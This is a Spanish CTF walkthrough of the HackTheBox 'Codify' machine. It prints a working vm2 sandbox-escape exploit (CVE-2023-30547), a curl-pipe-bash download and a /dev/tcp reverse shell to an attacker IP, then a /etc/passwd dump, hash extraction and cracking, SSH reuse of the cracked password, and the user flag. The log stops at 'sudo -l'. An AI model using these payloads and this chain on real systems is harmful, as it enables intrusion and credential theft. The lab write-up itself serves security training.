La vía directa de importar módulos peligrosos queda bloqueada. Por tanto, el análisis pasa a centrarse en la robustez del sandbox utilizado por la aplicación.

La página `/about` identifica `vm2` y enlaza a la versión `3.9.16`. Dado que `/run` ejecuta código JavaScript controlado por el usuario, la candidata pública principal pasa a ser una vulnerabilidad de escape de sandbox que afecte a esa versión de `vm2`.
```
La revisión de vulnerabilidades públicas que afectan a la biblioteca `vm2` conduce a `CVE-2023-30547`. La vulnerabilidad en cuestión afecta a versiones hasta la `3.9.16`. Implica una sanitización incorrecta de excepciones dentro del sandbox de `vm2`, una funcionalidad destinada a ejecutar de forma segura código no confiable. Los atacantes pueden explotar este fallo provocando una excepción del host que no se sanitiza correctamente en la función `handleException()`. Al hacerlo, pueden escapar del entorno sandbox y ejecutar código arbitrario dentro del contexto del host.

En `http://codify.htb/editor`, se elimina el contenido existente del editor y se ejecuta el siguiente código:

const {VM} = require("vm2");
const vm = new VM();
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('id');
}
`
console.log(vm.run(code));

Y responde uid=1001(svc) gid=1001(svc) groups=1001(svc)

## La ejecución se completa correctamente y muestra el `uid` (*User Identifier*) del usuario `svc`. A partir de esta validación se prepara una reverse shell.

## Se crea localmente un script Bash que iniciará una conexión de vuelta a la máquina atacante.

## Ejecución en la máquina atacante:

❯ echo -e '#!/bin/bash\nsh -i >& /dev/tcp/<YOUR_IP>/4444 0>&1' > rev.sh

## Al mostrar `rev.sh`, el contenido es el siguiente:

#!/bin/bash
sh -i >& /dev/tcp/10.10.15.26/4444 0>&1

## Se asignan permisos de ejecución:
❯ chmod +x rev.sh

## Después, se inicia un servidor Python para alojar el script.

❯ python3 -m http.server 8081
Serving HTTP on 0.0.0.0 port 8081 (http://0.0.0.0:8081/) ...

## Finalmente, se inicia un listener de Netcat para recibir la reverse shell cuando el script sea ejecutado.

❯ nc -lvnp 4444

## En `http://codify.htb/editor` se ejecuta una versión actualizada de la PoC que utiliza `curl` para obtener el script desde el servidor web Python y lo canaliza a través de Bash:

const {VM} = require("vm2");
const vm = new VM();
const code = `
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};

const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync('curl http://10.10.15.26:8081/rev.sh|bash');
}
`
console.log(vm.run(code));

### Recepción de la reverse shell la conexión de vuelta y se obtiene una shell con el usuario `svc`:

❯ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.15.26] from (UNKNOWN) [10.129.40.127] 41374
sh: 0: can't access tty; job control turned off
$ script /dev/null -c bash
Script started, output log file is '/dev/null'.
svc@codify:~$ export TERM=xterm
export TERM=xterm
svc@codify:~$ whoami
whoami
svc
svc@codify:~$ id
id
uid=1001(svc) gid=1001(svc) groups=1001(svc)
svc@codify:~$ hostname
hostname
codify
svc@codify:~$ pwd
pwd
/home/svc

## Se revisa el contenido de `/etc/passwd` para identificar otros usuarios del sistema:

svc@codify:~$ cat /etc/passwd
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:113:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
fwupd-refresh:x:114:122:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false

### Objetivo

Pasar de **foothold como `svc`** a **movimiento lateral**, buscando el artefacto local indicado por el writeup oficial: la base SQLite en `/var/www/contacts`.

### Hechos verificados

Ya se dispone de shell en la máquina como:

```text
svc
uid=1001(svc) gid=1001(svc) groups=1001(svc)
hostname: codify
directorio: /home/svc
```

En `/etc/passwd` aparecen dos usuarios interactivos relevantes:

```text
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
svc:x:1001:1001:,,,:/home/svc:/bin/bash
```

Según el writeup oficial, tras obtener shell como `svc`, la ruta siguiente es revisar directorios web y localizar una base SQLite en `/var/www/contacts`, concretamente `tickets.db`.

### Suposiciones

La flag de usuario probablemente no está en `/home/svc`, sino en `/home/joshua`.

La base `tickets.db` puede contener usuarios, hashes o credenciales reutilizables para pivotar hacia `joshua`.

### Método

Todavía no se transfiere ni se crackea ningún artefacto.

Primero corresponde confirmar localmente:

```text
¿existe /var/www/contacts?
¿qué permisos tiene?
¿existe tickets.db?
¿es realmente SQLite?
¿qué tamaño y propietario tiene?
```

### Análisis

El siguiente paso consiste en revisar `/var/www/contacts`.

Este es un cambio de rama bien justificado:

```text
RCE web -> shell svc -> enumeración local -> SQLite web -> credenciales/hash -> posible SSH como joshua
```

La señal dominante deja de ser `vm2`. Ya se dispone de foothold. A continuación manda la búsqueda de credenciales locales reutilizables.

### Comandos

Ejecución dentro de la shell de `svc`:

```bash
cd /var/www/contacts && pwd && ls -la && file tickets.db
```

Qué hace:

* entra en `/var/www/contacts`;
* confirma el directorio real con `pwd`;
* lista permisos y ficheros;
* comprueba si `tickets.db` es una base SQLite.

Elemento de interés de verdad:

```text
tickets.db
SQLite
propietario
permisos
tamaño
```

### Comprobaciones

Se registra la salida completa de:

```bash
cd /var/www/contacts && pwd && ls -la && file tickets.db
```

Con esa evidencia se decide el siguiente paso único: leer la base en la víctima si `sqlite3` está disponible, o transferirla a la máquina atacante si conviene conservar mejor la evidencia.

### Ejecución

ssvc@codify:~$ ls -la /var/www && find /var/www -maxdepth 5 -type f -name tickets.db 2>/dev/null && find /var/www -maxdepth 5 -type f -name "*.db" 2>/dev/null
ls -la /var/www && find /var/www -maxdepth 5 -type f -name tickets.db 2>/dev/null && find /var/www -maxdepth 5 -type f -name "*.db" 2>/dev/null
total 20
drwxr-xr-x  5 root root 4096 Sep 12  2023 .
drwxr-xr-x 13 root root 4096 Oct 31  2023 ..
drwxr-xr-x  3 svc  svc  4096 Sep 12  2023 contact
drwxr-xr-x  4 svc  svc  4096 Sep 12  2023 editor
drwxr-xr-x  2 svc  svc  4096 Apr 12  2023 html
/var/www/contact/tickets.db
/var/www/contact/tickets.dbvc@codify:/var/www/contacts$ cd /var/www/contacts && pwd && ls -la && file tickets.db

### Objetivo

Corregir la ruta real del artefacto y continuar con la enumeración de la base SQLite localizada.

### Hechos verificados

La ruta correcta **no** es:

```text
/var/www/contacts
```

La ruta real en esta instancia es:

```text
/var/www/contact
```

Dentro de `/var/www` existen estos directorios relevantes:

```text
/var/www/contact
/var/www/editor
/var/www/html
```

Y se ha localizado la base de datos:

```text
/var/www/contact/tickets.db
```

### Suposiciones

La base `tickets.db` es el artefacto esperado para el movimiento lateral.

Probablemente contiene una tabla de usuarios o tickets con información reutilizable, posiblemente un hash asociado al usuario `joshua`.

### Método

Ya no se sigue el nombre exacto del directorio de la bitácora de referencia, sino la evidencia real observada en la máquina.

La cadena queda así:

```text
/var/www/contacts no existe
-> enumeración de /var/www
-> aparece /var/www/contact
-> se localiza tickets.db
-> siguiente paso: confirmar tipo de base y revisar si sqlite3 está disponible
```

### Análisis

Se localiza la base de datos en el directorio singular:

```text
/var/www/contact/tickets.db
```

Este punto es importante para el MD: la bitácora de referencia orienta, pero la evidencia de la máquina prevalece. Si la ruta real cambia, se documenta la corrección y se continúa con evidencia.

Todavía no se transfiere. Primero se comprueban permisos, tipo de fichero y si la propia máquina tiene `sqlite3`.

### Comandos

Ejecución de este comando dentro de la shell de `svc`:

```bash
cd /var/www/contact && pwd && ls -la && file tickets.db && which sqlite3
```

### Comprobaciones

Se registra la salida completa.

Interesa ver:

```text
pwd              -> /var/www/contact
tickets.db       -> existe
file tickets.db  -> SQLite database
which sqlite3    -> si está instalado o no
```

Si `sqlite3` está disponible, el siguiente paso será leer tablas directamente desde la víctima.

Si no está disponible, decidiremos una transferencia limpia a la máquina atacante.

### Notas para el informe técnico

```md
### Localización de la base de datos de la aplicación

Tras obtener shell como `svc`, se revisaron los directorios web bajo `/var/www`. Aunque la ruta esperada inicialmente era `/var/www/contacts`, dicha ruta no existía en la instancia trabajada.

Se enumeró `/var/www` y se identificó el directorio real `/var/www/contact`, propiedad del usuario `svc`. Dentro de ese directorio se localizó la base de datos `tickets.db`.

Este ajuste es importante metodológicamente: la bitácora de referencia orienta el camino, pero la ruta final debe validarse siempre contra la evidencia real del sistema.
```

### Estado actual

```text
Hallazgo dominante: tickets.db localizado en /var/www/contact.
Rama principal activa: enumeración local / credenciales.
Ramas secundarias: SSH abierto pendiente de credencial.
Siguiente paso único: confirmar tipo de tickets.db y disponibilidad de sqlite3.
```
### Ejecución

svc@codify:~$ cd /var/www/contact && pwd && ls -la && file tickets.db && which sqlite3
cd /var/www/contact && pwd && ls -la && file tickets.db && which sqlite3
/var/www/contact
total 120
drwxr-xr-x 3 svc  svc   4096 Sep 12  2023 .
drwxr-xr-x 5 root root  4096 Sep 12  2023 ..
-rw-rw-r-- 1 svc  svc   4377 Apr 19  2023 index.js
-rw-rw-r-- 1 svc  svc    268 Apr 19  2023 package.json
-rw-rw-r-- 1 svc  svc  77131 Apr 19  2023 package-lock.json
drwxrwxr-x 2 svc  svc   4096 Apr 21  2023 templates
-rw-r--r-- 1 svc  svc  20480 Sep 12  2023 tickets.db
tickets.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 17, database pages 5, cookie 0x2, schema 4, UTF-8, version-valid-for 17
/usr/bin/sqlite3

### Objetivo

Abrir la base SQLite `tickets.db` de forma controlada y enumerar primero sus tablas, sin asumir todavía el nombre de ninguna tabla interna.

### Hechos verificados

La ruta correcta es:

```text
/var/www/contact
```

La base existe:

```text
/var/www/contact/tickets.db
```

El fichero es una base SQLite válida:

```text
tickets.db: SQLite 3.x database
```

La máquina tiene `sqlite3` instalado:

```text
/usr/bin/sqlite3
```

El directorio contiene una pequeña aplicación Node.js de contacto/tickets:

```text
index.js
package.json
package-lock.json
templates/
tickets.db
```

### Suposiciones

La base `tickets.db` probablemente contiene información de usuarios, tickets o credenciales reutilizables.

Todavía no asumimos el nombre de la tabla. Aunque el camino esperado apunta a una tabla de usuarios, primero hay que verlo en la base real.

### Método

Primero se enumeran las tablas.

Después, según la salida real, se decide qué tabla consultar.

No conviene lanzar todavía un `SELECT * FROM users;` hasta confirmar que `users` existe en esta instancia.

### Análisis

Este hallazgo es importante: se dispone del artefacto local que probablemente permite pivotar de `svc` hacia otro usuario.

La cadena queda así:

```text
foothold como svc
-> enumeración de /var/www
-> tickets.db localizado
-> SQLite confirmado
-> sqlite3 disponible
-> siguiente paso: listar tablas
```

### Comandos

Ejecución únicamente de este comando dentro de la shell de `svc`:

```bash
sqlite3 /var/www/contact/tickets.db ".tables"
```

Qué hace:

* abre la base SQLite;
* lista las tablas existentes;
* no modifica nada;
* permite conocer qué estructura real tiene la base.

Resultado esperado:

```text
tickets
users
```

o algún conjunto parecido.

### Comprobaciones

Se registra la salida exacta de:

```bash
sqlite3 /var/www/contact/tickets.db ".tables"
```

Con esa salida se define el siguiente comando completo, ya sin suposiciones.

### Notas para el informe técnico

```md
### Localización y validación de la base SQLite

Durante la enumeración local se localizó la base `tickets.db` en `/var/www/contact`. Aunque la ruta esperada inicialmente apuntaba a `/var/www/contacts`, la evidencia real de la máquina mostró que el directorio correcto era `contact` en singular.

El fichero fue identificado como una base SQLite 3.x y se confirmó que la utilidad `sqlite3` estaba disponible en el sistema, permitiendo revisar su estructura directamente desde la shell obtenida como `svc`.
```

### Estado actual

```text
Hallazgo dominante: tickets.db localizado y confirmado como SQLite.
Rama principal activa: extracción de credenciales/hash desde base local.
Ramas secundarias: SSH abierto pendiente de credencial.
Siguiente paso único: listar tablas de tickets.db.
```
### Ejecución

svc@codify:/var/www/contact$ sqlite3 /var/www/contact/tickets.db ".tables"
sqlite3 /var/www/contact/tickets.db ".tables"
tickets  users

### Objetivo

Enumerar la tabla `users` de `tickets.db`, porque es la candidata principal a contener credenciales, hashes o datos reutilizables para pivotar hacia `joshua`.

### Hechos verificados

La base SQLite contiene dos tablas:

```text
tickets  users
```

La tabla `users` existe y es a continuación el objetivo prioritario.

### Suposiciones

La tabla `users` puede contener:

```text
usuarios
hashes
contraseñas
emails
datos reutilizables
```

La tabla `tickets` puede aportar contexto, pero para movimiento lateral la prioridad lógica es `users`.

### Método

Primero se revisan la estructura y el contenido de `users`.

Todavía no se revisa `tickets`, porque la vía más probable hacia SSH pasa por un usuario y un hash reutilizable.

### Análisis

Aparece la tabla prioritaria:

```text
users
```

A continuación se procede a verla de forma limpia, con cabeceras y formato legible.

### Comandos

Ejecución de este comando dentro de la shell de `svc`:

```bash
sqlite3 /var/www/contact/tickets.db ".schema users" ".headers on" ".mode column" "SELECT * FROM users;"
```

Qué hace:

* muestra la estructura de la tabla `users`;
* activa cabeceras;
* mejora el formato de salida;
* vuelca el contenido de la tabla.

Elemento de interés:

```text
id
username
password
hash
usuario joshua
hash bcrypt
```

### Comprobaciones

Se registra la salida completa.

Si aparece un hash tipo:

```text
$2a$...
$2b$...
$2y$...
```

lo clasificaremos como `bcrypt` y el siguiente paso será preparar el crackeo offline en la máquina atacante.

### Notas para el informe técnico

```md
### Enumeración de la base SQLite

Tras confirmar que `tickets.db` era una base SQLite válida, se listaron sus tablas mediante `.tables`. La base contenía las tablas `tickets` y `users`.

La tabla `users` pasó a ser prioritaria porque podía contener credenciales o hashes reutilizables para pivotar desde el usuario `svc` hacia otro usuario local del sistema.
```

### Estado actual

```text
Hallazgo dominante: tickets.db contiene tabla users.
Rama principal activa: extracción de hash/credencial desde SQLite.
Ramas secundarias: SSH abierto pendiente de credencial.
Siguiente paso único: volcar la tabla users.
```
### Ejecución

svc@codify:/var/www/contact$ sqlite3 /var/www/contact/tickets.db ".schema users" ".headers on" ".mode column" "SELECT * FROM users;"
sqlite3 /var/www/contact/tickets.db ".schema users" ".headers on" ".mode column" "SELECT * FROM users;"
CREATE TABLE users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        username TEXT UNIQUE,
        password TEXT
    );
id  username  password
--  --------  ------------------------------------------------------------
3   joshua    $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2

### Objetivo

Extraer el hash de `joshua`, clasificarlo y preparar el crackeo offline en la máquina atacante.

### Hechos verificados

La tabla `users` existe y contiene un usuario relevante:

```text
username: joshua
password: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

La estructura de la tabla es:

```sql
CREATE TABLE users (
  id INTEGER PRIMARY KEY AUTOINCREMENT,
  username TEXT UNIQUE,
  password TEXT
);
```

El hash empieza por:

```text
$2a$12$
```

Eso indica formato **bcrypt**.

### Suposiciones

El hash pertenece al usuario `joshua`, que ya vimos en `/etc/passwd` como usuario local con shell:

```text
joshua:x:1000:1000:,,,:/home/joshua:/bin/bash
```

Si se crackea la contraseña, la vía más probable será probar acceso SSH como `joshua`.

### Método

El crackeo no se realiza en la víctima, sino en la máquina atacante.

La cadena a continuación es:

```text
tickets.db
-> tabla users
-> hash bcrypt de joshua
-> crackeo offline
-> posible SSH como joshua
```

### Análisis

Este es el pivote esperado: se ha obtenido el hash bcrypt de `joshua`.

En una terminal local de la máquina atacante, fuera de la shell de `svc`, se guarda el hash en un fichero.

### Comandos

En la máquina atacante:

```bash
cd /home/r4mon/pentest/targets/HTB/easy/Codify

mkdir -p loot

cat > loot/joshua_hash.txt <<'EOF'
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
EOF

cat loot/joshua_hash.txt
```

Después se lanza Hashcat en modo bcrypt:

```bash
hashcat -m 3200 loot/joshua_hash.txt /usr/share/wordlists/rockyou.txt
```

Si ya se había probado antes o termina rápido, se muestra el resultado con:

```bash
hashcat -m 3200 loot/joshua_hash.txt --show
```

### Comprobaciones

Se registra la salida de:

```bash
hashcat -m 3200 loot/joshua_hash.txt --show
```

El resultado esperado ver es algo con esta forma:

```text
$2a$12$...:contraseña_en_claro
```

### Notas para el informe técnico

```md
### Extracción de hash desde SQLite

La base `tickets.db` contenía una tabla `users` con credenciales de aplicación. Al volcar su contenido se identificó el usuario `joshua` junto a un hash bcrypt.

El prefijo `$2a$12$` permitió clasificar el hash como bcrypt, por lo que se preparó su crackeo offline desde la máquina atacante usando Hashcat en modo `3200`.

Este hallazgo es relevante porque `joshua` también existe como usuario local del sistema con shell interactiva, lo que abre una posible vía de movimiento lateral mediante reutilización de contraseña.
```

### Estado actual

```text
Hallazgo dominante: hash bcrypt de joshua extraído desde tickets.db.
Rama principal activa: credenciales / movimiento lateral.
Ramas secundarias: SSH abierto pendiente de contraseña.
Siguiente paso único: crackear el hash offline y validar si la contraseña permite SSH como joshua.
```
### Ejecución

❯ cd /home/r4mon/pentest/targets/HTB/easy/Codify

cat > rev.sh <<'EOF'
#!/bin/bash
sh -i >& /dev/tcp/10.10.15.26/4444 0>&1
EOF

chmod +x rev.sh
cat rev.sh
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: rev.sh
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ #!/bin/bash
   2   │ sh -i >& /dev/tcp/10.10.15.26/4444 0>&1
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ cd /home/r4mon/pentest/targets/HTB/easy/Codify

mkdir -p loot

cat > loot/joshua_hash.txt <<'EOF'
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
EOF

cat loot/joshua_hash.txt
───────┬───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: loot/joshua_hash.txt
───────┼───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
───────┴───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
❯ hashcat -m 3200 loot/joshua_hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.1+debian  Linux, None+Asserts, RELOC, SPIR, LLVM 15.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
==================================================================================================================================================
* Device #1: pthread-haswell-Intel(R) Core(TM) i7-10750H CPU @ 2.60GHz, 2802/5668 MB (1024 MB allocatable), 8MCU

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 72

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Optimizers applied:
* Zero-Byte
* Single-Hash
* Single-Salt

Watchdog: Temperature abort trigger set to 90c

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344385
* Bytes.....: 139921507
* Keyspace..: 14344385

Cracking performance lower than expected?

* Append -w 3 to the commandline.
  This can cause your screen to lag.

* Append -S to the commandline.
  This has a drastic speed impact but can be better for specific attacks.
  Typical scenarios are a small wordlist but a large ruleset.

* Update your backend API runtime / driver the right way:
  https://hashcat.net/faq/wrongdriver

* Create more work items to make use of your parallelization power:
  https://hashcat.net/faq/morework

$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2:spongebob1

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLH.../p/Zw2
Time.Started.....: Wed May  6 18:59:25 2026 (40 secs)
Time.Estimated...: Wed May  6 19:00:05 2026 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:       35 H/s (6.48ms) @ Accel:8 Loops:16 Thr:1 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 1408/14344385 (0.01%)
Rejected.........: 0/1408 (0.00%)
Restore.Point....: 1344/14344385 (0.01%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4080-4096
Candidate.Engine.: Device Generator
Candidates.#1....: teacher -> tagged
Hardware.Mon.#1..: Util: 89%

Started: Wed May  6 18:59:17 2026
Stopped: Wed May  6 19:00:07 2026

### Objetivo

Cerrar el movimiento lateral desde `svc` hacia `joshua`, usando la contraseña recuperada tras crackear el hash bcrypt.

### Hechos verificados

Hash extraído de `tickets.db`:

```text
$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2
```

Hashcat lo ha crackeado correctamente en modo bcrypt `3200`:

```text
Status: Cracked
```

Credencial recuperada:

```text
joshua:spongebob1
```

SSH estaba abierto desde fase 1:

```text
22/tcp open ssh OpenSSH 8.9p1 Ubuntu
```

### Suposiciones

La contraseña `spongebob1` puede reutilizarse como contraseña local/SSH del usuario `joshua`.

Si el acceso SSH funciona, se pasaría de una reverse shell frágil como `svc` a una sesión estable como `joshua`.

### Método

La cadena queda así:

```text
SQLite tickets.db
-> tabla users
-> hash bcrypt de joshua
-> crackeo offline con hashcat
-> contraseña spongebob1
-> validación por SSH
```

No se continúa con escalada hasta confirmar acceso real como `joshua`.

### Análisis

Este es el pivote clave de la máquina.

El acceso ya no depende únicamente de la reverse shell como `svc`. A continuación se valida si la contraseña recuperada abre una sesión SSH estable como `joshua`.

### Comandos

Este comando se ejecuta desde la máquina atacante, no dentro de la shell `svc`:

```bash
ssh joshua@10.129.40.127
```

Cuando solicite contraseña, introducir:

```text
spongebob1
```

### Comprobaciones

Se registra la salida del inicio de sesión SSH.

No se ejecutan más comandos dentro de SSH hasta confirmar el acceso como `joshua`.

### Notas para el informe técnico

```md
### Crackeo del hash y movimiento lateral

La tabla `users` de `tickets.db` contenía un hash bcrypt asociado al usuario `joshua`. El prefijo `$2a$12$` permitió identificar el formato como bcrypt, por lo que se preparó el crackeo offline desde la máquina atacante con Hashcat en modo `3200`.

El hash fue crackeado correctamente y reveló la contraseña `spongebob1`. Dado que `joshua` existía como usuario local con shell interactiva y SSH estaba expuesto desde la fase inicial, la siguiente validación fue comprobar si esa contraseña permitía acceso SSH como `joshua`.
```

### Estado actual

```text
Hallazgo dominante: contraseña de joshua recuperada por crackeo offline.
Rama principal activa: movimiento lateral / SSH.
Ramas secundarias: escalada local pendiente.
Siguiente paso único: validar acceso SSH como joshua.
```
### Ejecución

svc@codify:/var/www/contact$ ssh joshua@10.129.40.127
ssh joshua@10.129.40.127
The authenticity of host '10.129.40.127 (10.129.40.127)' can't be established.
ED25519 key fingerprint is SHA256:Q8HdGZ3q/X62r8EukPF0ARSaCd+8gEhEJ10xotOsBBE.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
yes
Warning: Permanently added '10.129.40.127' (ED25519) to the list of known hosts.
joshua@10.129.40.127's password: spongebob1

Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-88-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed May  6 05:19:16 PM UTC 2026

  System load:                      0.0
  Usage of /:                       63.9% of 6.50GB
  Memory usage:                     22%
  Swap usage:                       0%
  Processes:                        242
  Users logged in:                  0
  IPv4 address for br-030a38808dbf: 172.18.0.1
  IPv4 address for br-5ab86a4e40d0: 172.19.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.40.127
  IPv6 address for eth0:            dead:beef::a0de:adff:feb9:c667


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Wed Mar 27 13:01:24 2024 from 10.10.14.23
joshua@codify:~$ whoami
whoami
joshua
joshua@codify:~$ id
id
uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
joshua@codify:~$ hostname
hostname
codify
joshua@codify:~$ pwd
pwd
/home/joshua
joshua@codify:~$ ls -la
ls -la
total 32
drwxrwx--- 3 joshua joshua 4096 Nov  2  2023 .
drwxr-xr-x 4 joshua joshua 4096 Sep 12  2023 ..
lrwxrwxrwx 1 root   root      9 May 30  2023 .bash_history -> /dev/null
-rw-r--r-- 1 joshua joshua  220 Apr 21  2023 .bash_logout
-rw-r--r-- 1 joshua joshua 3771 Apr 21  2023 .bashrc
drwx------ 2 joshua joshua 4096 Sep 14  2023 .cache
-rw-r--r-- 1 joshua joshua  807 Apr 21  2023 .profile
-rw-r----- 1 root   joshua   33 May  6 11:35 user.txt
-rw-r--r-- 1 joshua joshua   39 Sep 14  2023 .vimrc
joshua@codify:~$ cat user.txt
cat user.txt
11dd43c706035918d593ce3b7cbd24fd

### Objetivo

Cerrar el movimiento lateral como `joshua` y empezar la fase de **escalada local de privilegios** de forma ordenada.

### Hechos verificados

Acceso SSH como `joshua` confirmado:

```text
whoami -> joshua
id     -> uid=1000(joshua) gid=1000(joshua) groups=1000(joshua)
host   -> codify
pwd    -> /home/joshua
```

Flag de usuario leída correctamente:

```text
user.txt -> 11dd43c706035918d593ce3b7cbd24fd
```

El movimiento lateral ha funcionado:

```text
svc -> tickets.db -> hash bcrypt -> spongebob1 -> SSH como joshua
```

### Suposiciones

A continuación el vector de escalada probablemente estará en permisos locales de `joshua`, especialmente `sudo`.

No asumimos todavía el script vulnerable hasta verlo en la salida real de la máquina.

### Método

La siguiente comprobación mínima en cualquier escalada Linux tras conseguir un usuario estable por SSH es:

```text
sudo -l
```

Esto permite comprobar si `joshua` puede ejecutar algún comando como otro usuario, normalmente `root`.

### Análisis

Esta fase queda cerrada: el acceso ya no depende de la reverse shell como `svc`; se dispone de una sesión SSH estable como `joshua`.

Siguiente paso único: revisar permisos `sudo`.

### Comandos

Ejecución dentro de la sesión SSH como `joshua`:

```bash
sudo -l
```

Cuando solicite contraseña, introducir:

```text
spongebob1
```

### Comprobaciones

Se registra la salida completa de `sudo -l`.

No se ejecuta todavía nada de lo que aparezca permitido. Primero se analiza:

```text
qué binario o script permite ejecutar
como qué usuario
si requiere contraseña
qué argumentos admite
si el script es legible
```

### Notas para el informe técnico

```md
### Acceso SSH como joshua

Tras crackear el hash bcrypt extraído de `tickets.db`, se validó la reutilización de la contraseña obtenida contra el servicio SSH expuesto desde la fase inicial.

El acceso como `joshua` fue correcto, lo que permitió consolidar una sesión estable y leer la flag de usuario en `/home/joshua/user.txt`.

A partir de este punto, la fase de explotación inicial y movimiento lateral queda cerrada, y comienza la enumeración local orientada a escalada de privilegios.
```

### Estado actual

```text
Hallazgo dominante: acceso SSH estable como joshua.
Rama principal activa: escalada local Linux.
Ramas secundarias: ninguna prioritaria ahora.
Siguiente paso único: ejecutar sudo -l y analizar permisos.
```

### Ejecución

joshua@codify:~$ sudo -l
sudo -l
